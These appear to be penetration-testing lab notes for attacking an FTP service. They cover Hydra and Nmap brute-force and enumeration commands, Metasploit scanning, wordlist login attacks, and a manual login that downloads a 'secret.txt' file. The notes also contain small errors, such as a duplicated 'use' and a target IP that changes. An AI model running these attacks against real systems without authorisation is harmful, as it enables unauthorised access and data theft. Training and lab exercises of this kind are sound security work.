ðŸ“ FTP Enumeration and Exploitation Workflow
This workflow documents the reconnaissance, authentication attacks, and initial file retrieval against a target system running an FTP service, 
utilizing Metasploit and basic command-line tools.

FTP: Brute forcing attacks on FTP
This command employs Hydra to perform a brute-force attack on an FTP service on the target using a list of usernames and passwords.
1. username_list_path --> /usr/share/xyz/common_users.txt
2. pass_list_path     --> /usr/share/xyz/common_paswords.txt

> hydra -L <username_list_path> -P <pass_list_path> <target> ftp

FTP: Nmap Enumeration Scripts

1. ftp-anon: Checks for anonymous FTP login.
> nmap --script ftp-anon -p 21 target-ip

2. ftp-brute: Performs a brute-force attack on FTP passwords.
> nmap --script ftp-brute -p 21 target-ip

3. ftp-bounce: Exploits FTP bounce attacks to port scan.
> nmap --script ftp-bounce -p 21 target-ip

4. ftp-vsftpd-backdoor: Checks for the presence of the VSFTPD backdoor vulnerability.
> nmap --script ftp-vsftpd-backdoor -p 21 target-ip

5. ftp-syst: Retrieves system information from the FTP server.
> nmap --script ftp-syst -p 21 target-ip

---------------------------------------------------------------------------------------------------------------
                    Phase 1: Initial Setup and Reconnaissance using Auxiliary Modules
---------------------------------------------------------------------------------------------------------------
Objective: Verify the target environment and perform an initial port scan to confirm the FTP service is running.

# Identify the target IP address
# Assuming Attacker IP (eth1) is 195.51.147.2
# Target IP will be the adjacent host
Target IP: 195.51.147.3

> service postgresql start                                            # Start the Metasploit database service
> msfconsole                                                          # Start Metasploit console
msf5 > workspace -a FTP_ENUM                                          # Create a new workspace for this task
msf5 > search portscan                                                # Search for the port scanning module (to confirm FTP port 21 is open)
msf5 > use use auxiliary/scanner/portscan/tcp  
msf5 > show options                                                   # View configuration options
msf5 > set RHOSTS 195.51.147.3                                        # Set the target IP address
msf5 > run                                                            # Execute the port scan
msf5 > back                                                           # Return to the main msfconsole prompt

Phase 2: FTP Service Enumeration (Version Scanning)
Objective: Use an auxiliary module to gather the specific version information of the running FTP service.

msf5 > search type:auxiliary name:ftp                                 # Search for FTP auxiliary modules
msf5 > use auxiliary/scanner/ftp/ftp_version                          # Select the module for gathering FTP version information
msf5 > show options                                                   # View configuration options
msf5 > set RHOSTS 195.51.147.3                                        # Set the target IP address
msf5 > run                                                            # Execute the module

Exploit Search (Based on Version)

msf5 > search ProFTPD                                                 # If the version scan reveals a specific service (e.g., ProFTPD), search for exploits 
                                                                      # This helps identify any known vulnerabilities for the discovered service.
Phase 3: Credential Brute-Forcing
Objective: Attempt to gain unauthorized access by brute-forcing common usernames and passwords against the FTP login.

msf5 > back                                                           # Return to the main console
msf5 > search type:auxiliary name:ftp                                 # Search again for FTP auxiliary modules
msf5 > use auxiliary/scanner/ftp/ftp_login                            # Select the module for dictionary-based FTP login attempts
msf5 > show options                                                   # View configuration options (RHOSTS, USER_FILE, PASS_FILE)
msf5 > set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt          # Set the path to a file containing a list of usernames
msf5 > set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt        # Set the path to a file containing a list of passwords
msf5 > run                                                                                    # Execute the brute-force attack

Phase 4: Manual Access and File Retrieval
Objective: Use the discovered credentials to manually log in and extract sensitive files.
Manual FTP Session

msf5 > exit                                                          # Exit Metasploit (optional, but standard practice for manual testing)
root@attackdefense:~# ftp 195.51.147.3                               # Initiate a manual FTP connection from the attacker's shell
user: username                                                       # Provide the discovered credentials
password: password
ftp> ls                                                              # List files on the remote server
ftp> get secret.txt                                                  # Retrieve a target file (e.g., a sensitive file named 'secret.txt')
ftp> exit                                                            # Exit the FTP session
root@attackdefense:~# ls                                             # Verify the file was downloaded to the attacker's system
root@attackdefense:~# cat secret.txt                                 # View the contents of the retrieved file

ðŸ”’ FTP Anonymous Login Test
Objective: Check if the target FTP service allows anonymous authentication, which often grants read access to files.

msf5 > search type:auxiliary name:ftp         # Search for FTP auxiliary modules
msf5 > use auxiliary/scanner/ftp/anonymous    # Use the module specifically designed to check for anonymous login
msf5 > show options                           # View configuration options
msf5 > set RHOSTS 192.51.147.3                # Set the target IP address
msf5 > run                                    # Execute the module to check for anonymous access
